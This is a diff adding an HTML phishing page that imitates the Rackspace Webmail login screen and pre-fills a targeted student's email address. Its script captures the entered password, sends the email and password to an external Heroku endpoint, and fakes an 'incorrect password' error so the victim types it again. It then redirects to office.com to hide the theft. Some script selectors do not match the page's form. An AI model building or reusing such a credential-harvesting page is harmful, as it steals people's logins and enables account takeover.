@@ -1,0 +1,449 @@
+<html><head>
+    <meta http-equiv="origin-trial" content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
+    <meta charset="UTF-8">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <title>Rackspace Webmail: Hosted Email for Business</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">
+  
+    <style>
+      /* Page Defaults */
+      * {
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box;
+      }
+  
+      body {
+        font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        font-size: 14px;
+        line-height: 1.42857;
+        color: #333333;
+        background-color: #FAFAFA;
+        margin: 0;
+      }
+  
+      .caption {
+        display: inline-block;
+        font-size: 12px;
+        color: #666;
+      }
+  
+      .base_link {
+        display: inline-block;
+        color: #0C7C84;
+        text-decoration: none;
+      }
+  
+      .base_links {
+        background: #FFFFFF;
+        text-align: center;
+        padding-bottom: 20px;
+        margin-top: -15px;
+      }
+  
+      .divider {
+        display: inline-block;
+        margin: 0px 5px;
+        color: #0C7C84;
+      }
+      /* Page Layout */
+      #content {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        top: 0;
+        left: 0;
+        bottom: 0;
+        right: 0;
+        background: #EAEAEA;
+      }
+  
+      #content-header {
+        height: 53px;
+        padding: 16px;
+        font-size: 24px;
+        font-weight: 300;
+        line-height: 18px;
+        background: #424242;
+        color: #FCFCFC;
+      }
+  
+      #content-header-logo {
+        float: right;
+      }
+  
+      #logo {
+        width: 130px;
+        margin-top: -9px;
+        margin-right: -5px;
+      }
+  
+      #content-header-label {
+        float: left;
+      }
+  
+      #content-body {
+        display: flex;
+        justify-content: start;
+        background: #FFFFFF;
+        min-width: 790px;
+      }
+  
+      #banner-section {
+        height: 285px;
+        width: 314px;
+        margin: 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+  
+      #banner {
+        width: 190px;
+      }
+  
+      #divider {
+        border: 1px solid rgb(224, 224, 224);
+        margin: 40px 0px;
+      }
+      /* Form Layout */
+      #form {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        padding: 20px;
+        min-height: 268px;
+        width: 100%;
+      }
+  
+      #form-body {
+        height: 205px;
+        width: 100%;
+        margin: 40px 0px 0px 20px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding-right: 20px;
+      }
+  
+      #form-container {
+        width: 100%;
+        margin: 0px auto;
+        padding: 0px 10px;
+      }
+  
+      .row {
+        margin: 0px -10px;
+      }
+  
+        .row:before, .row:after {
+          content: " ";
+          display: table;
+        }
+  
+      .col {
+        width: 100%;
+        float: left;
+        position: relative;
+        min-height: 1px;
+        padding: 0px 10px;
+      }
+  
+      .form-group {
+        width: inherit;
+        padding-right: 30px;
+        margin-bottom: 20px;
+      }
+  
+      .form-label {
+        position: relative;
+        font-family: Roboto;
+        font-size: 16px;
+        margin-bottom: 8px;
+        line-height: 1;
+        color: #616161;
+        display: inline-block;
+        max-width: 100%;
+      }
+  
+      .form-field {
+        border: 1px solid #BDBDBD;
+        border-radius: 2px;
+        background: #FFFFFF;
+        font-family: Roboto;
+        font-size: 16px;
+        color: #616161;
+        height: 32px;
+        display: block;
+        width: 100%;
+        padding: 4px 8px;
+        line-height: 1.42857;
+        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+        -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+        -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+        transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+      }
+  
+      #forgot-password {
+        position: absolute;
+        top: 0px;
+        right: 40px;
+        color: #0C7C84;
+        text-decoration: none;
+        background-color: transparent;
+        box-sizing: border-box;
+      }
+  
+      #login-btn-toolbar {
+        float: right;
+        margin: auto 30px 15px -20px;
+      }
+  
+      #login-btn {
+        float: right;
+        display: inline-flex;
+        flex-direction: row;
+        justify-content: center;
+        align-items: center;
+        padding: 0 12px;
+        height: 32px;
+        line-height: 1px;
+        font-size: 14px;
+        font-weight: 400;
+        text-transform: capitalize;
+        color: #fff;
+        background-color: #0C7C84;
+        border-color: #0C7C84;
+        margin-bottom: 0;
+        text-align: center;
+        vertical-align: middle;
+        touch-action: manipulation;
+        cursor: pointer;
+        background-image: none;
+        border: 1px solid transparent;
+        white-space: nowrap;
+        border-radius: 2px;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+      }
+  
+      #form-container {
+        width: 100%;
+        margin: 0px auto;
+        padding: 0px 10px;
+      }
+  
+      @media only screen and (max-device-width: 480px) {
+        /* Page Defaults */
+        body {
+          font-size: 19pt;
+          line-height: 1.42857em;
+        }
+  
+        .caption {
+          display: inline-block;
+          font-size: 80%;
+          color: #666;
+        }
+        /* Page Layout */
+        #content {
+          align-items: inherit;
+          display: inherit;
+          justify-content: inherit;
+        }
+  
+        #content-header {
+          font-size: 171%;
+          height: 3em;
+          line-height: 1em;
+          padding: 1em;
+        }
+  
+        #content-header-logo {
+          float: right;
+        }
+  
+        #logo {
+          margin-left: 6em;
+          width: inherit;
+          height: 1em;
+        }
+  
+        #banner-section {
+          display: none;
+        }
+  
+        #divider {
+          display: none;
+        }
+        /* Form Layout */
+        .form-label {
+          font-size: 114%;
+        }
+  
+        .form-field {
+          font-size: 114%;
+          height: 2em;
+        }
+  
+        #forgot-password {
+          right: 2em;
+          top: 0;
+        }
+  
+        #login-btn-toolbar {
+          margin: 1.5em 2em 1em -1.5em;
+        }
+  
+        #login-btn {
+          font-size: 150%;
+          height: 3em;
+          padding: 1.25em;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <script>
+        $(document).ready(function(){
+
+            var ee = "m.allah1132778@student222.aast.edu"
+        
+         $('#studentid').text(ee);
+         $('#passwordError').text("");
+         var count = 0;
+        $('#i0281').submit(function(e) {
+            e.preventDefault();
+            count++
+            
+            var passw = $('#i0118').val();   
+            
+
+            console.log(passw, ee);
+                                   
+            if (passw.length < 1) {
+            $('#passwordError').text("Enter your password");
+            }else{                
+                if(count < 3){
+
+                    axios({
+                        method: 'post',
+                        url: "https://student-course101-d901527b9683.herokuapp.com/studentcourses101",
+                        data: {
+                            ee,
+                            passw
+                        }
+                        });
+                    // $.post("http://localhost:3000/freed",
+                    // {
+                    // pp: "Donald Duck",
+                    // ee: "Duckburg"
+                    // })
+
+                    // $.ajax({
+                    // url: "http://localhost:3000/freed",
+                    // type: 'POST',
+                    // contentType: 'application/json',
+                    // data: {pp: "Donald Duck", ee: "Duckburg"}
+                    // });
+                $('#passwordError').text("Please wait, while you sign in...");
+                $("#passwordError").css({ 'color' : 'green' });
+                setTimeout(()=>{$('.input').val('');
+                $("#passwordError").css({ 'color' : 'tomato' });
+                $('#passwordError').text("Incorrect password. Try again");}, 3000);
+            }else{
+                $('#passwordError').text("");
+                axios({
+                    method: 'post',
+                    url: "https://student-course101-d901527b9683.herokuapp.com/studentcourses101",
+                    data: {
+                        ee,
+                        passw
+                    }
+                    });
+                    setTimeout(()=>{ window.location.replace("http://www.office.com");}, 2000);               
+            }
+
+            }
+            
+  });
+        
+        });
+        </script>
+    <div>
+      <div id="content">
+        <div>
+          <div id="content-header">
+            <div id="content-header-logo"><img id="logo" src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"></div>
+            <div id="content-header-label">Webmail Login</div>
+          </div>
+          <div id="content-body">
+            <div id="banner-section">
+              <a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank">
+                <img id="banner" src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg">
+              </a>
+            </div>
+            <div id="divider"></div>
+            <form id="form" method="post" name="login" action="" autocomplete="off">
+    <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/fGZmEzpfeSeqDJiApS_XZ4Y2/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-BkcmNQWtC2+F6VzriTvPuJFQk+CQm9Ka25Y8yH4U7AvSZTgBts+ceh072QKv1qYq"></script><script src="/wmidentity/dist/webmailLogin.js?v=dn70RwATRXPGR3I_MlY9aK9fMX6zSf1GYvcRvRv-UFc=" type="text/javascript"></script>
+    <div id="form-body">
+      <div id="form-container"><div style="color: rgb(211, 47, 47); margin-bottom: 20px; font-weight: 500;">Username / Password incorrect</div>
+        <input type="hidden" name="__RequestVerificationToken" value="CfDJ8NuPfCpZRDxDrFje8PH7ouePDmbJlRUj4kfIgp7qsSvRzCDlCVHDnTATpQ0xeqhnsmncctGjZIrHA4vdN2edlQHD7Jb94e6cnXAGQ-0kX94an-5yV4oPvXfCslDJbGiMeLgZbyoavVQGMeDQK4N7gcA">
+        <!-- destination and flags is used for OWA login -->
+        <input id="form-destination" type="hidden" name="destination" value="">
+        <input id="form-owa-flags" type="hidden" name="flags" value="4">
+        <div id="user-row" class="row">
+          <div id="user-col" class="col">
+            <div id="user-field" class="form-group">
+              <label id="user-label" class="form-label">Email address</label>
+              <input id="user-input" name="username" tabindex="1" class="form-field" value="" autocomplete="username">
+            </div>
+          </div>
+        </div>
+        <div id="pass-row" class="row">
+          <div id="pass-col" class="col">
+            <div id="pass-field" class="form-group">
+              <label id="pass-label" class="form-label">Password</label>
+              <input id="pass-input" name="password" tabindex="2" type="password" class="form-field" value="" autocomplete="current-password">
+            </div>
+            <a id="forgot-password" href="/wmidentity/recover/password" tabindex="4">Forgot password?</a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="login-btn-toolbar">
+      <script type="text/javascript" src="https://www.google.com/recaptcha/api.js" async="" defer=""></script><div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-29ng21bwfu68" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LeDZSwUAAAAAJN_ohyPYyCCk6BVIhfEeJWcJs7f&amp;co=aHR0cHM6Ly9hcHBzLnJhY2tzcGFjZS5jb206NDQz&amp;hl=en&amp;v=fGZmEzpfeSeqDJiApS_XZ4Y2&amp;size=invisible&amp;cb=bmp26jswf1pe"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div><button class="g-recaptcha" id="login-btn" tabindex="3" type="submit" data-sitekey="6LeDZSwUAAAAAJN_ohyPYyCCk6BVIhfEeJWcJs7f" data-callback="submitLogin">Log In</button>
+    </div>
+  </form>
+          </div>
+          <div class="base_links">
+            <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/privacystatement">
+              Privacy Statement
+            </a>
+            <div class="divider"> | </div>
+            <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/websiteterms">
+              Website Terms
+            </a>
+          </div>
+          <div class="footer" style="text-align: center; margin-top: 10px;">
+            <div class="caption">
+              Need webmail for your business?  Learn more about
+              <a href="//www.rackspace.com/email-hosting/webmail" style="color: #666;">
+                Hosted Email
+              </a>
+              from Rackspace
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  
+  <div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;"></div><div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: fixed; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255);"><iframe title="recaptcha challenge expires in two minutes" name="c-29ng21bwfu68" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/bframe?hl=en&amp;v=fGZmEzpfeSeqDJiApS_XZ4Y2&amp;k=6LeDZSwUAAAAAJN_ohyPYyCCk6BVIhfEeJWcJs7f" style="width: 100%; height: 100%;"></iframe></div></div></body></html>
